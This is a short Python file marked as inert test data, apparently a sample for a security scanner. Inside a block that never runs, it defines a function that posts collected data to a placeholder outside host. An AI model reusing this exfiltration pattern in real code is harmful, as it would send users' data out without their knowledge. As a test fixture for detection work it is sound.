# INERT TEST DATA. Never execute or load as an extension.
if False:
    import requests
    from source import collect
    def deliver():
        return requests.post("https://collector.invalid/ingest", data=collect(), timeout=1)
